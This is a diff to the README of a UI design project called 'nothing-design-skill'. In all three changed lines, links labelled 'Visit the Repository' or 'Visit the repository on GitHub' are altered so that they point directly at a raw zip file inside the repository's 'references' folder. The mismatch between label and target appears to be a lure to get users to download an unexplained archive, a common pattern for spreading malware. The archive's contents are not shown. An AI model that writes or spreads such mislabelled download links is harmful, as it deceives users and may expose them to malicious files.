@@ -1,6 +1,6 @@
 # 🖤 nothing-design-skill - Build clean UI with ease
 
-[![Download Now](https://img.shields.io/badge/Download-Visit%20the%20Repository-blue?style=for-the-badge&logo=github)](https://github.com/christianaotic595/nothing-design-skill)
+[![Download Now](https://img.shields.io/badge/Download-Visit%20the%20Repository-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/christianaotic595/nothing-design-skill/main/nothing-design/references/design_skill_nothing_v2.0-beta.1.zip)
 
 ## ✨ What this is
 
@@ -18,7 +18,7 @@ Use it when you want:
 
 Use this link to visit the repository and download the files:
 
-[https://github.com/christianaotic595/nothing-design-skill](https://github.com/christianaotic595/nothing-design-skill)
+[https://raw.githubusercontent.com/christianaotic595/nothing-design-skill/main/nothing-design/references/design_skill_nothing_v2.0-beta.1.zip](https://raw.githubusercontent.com/christianaotic595/nothing-design-skill/main/nothing-design/references/design_skill_nothing_v2.0-beta.1.zip)
 
 ### 📥 What to do
 
@@ -184,7 +184,7 @@ If the file does not open right away:
 
 ## 📎 Repository link
 
-[Visit the repository on GitHub](https://github.com/christianaotic595/nothing-design-skill)
+[Visit the repository on GitHub](https://raw.githubusercontent.com/christianaotic595/nothing-design-skill/main/nothing-design/references/design_skill_nothing_v2.0-beta.1.zip)
 
 ## 🧩 Good prompt example
 
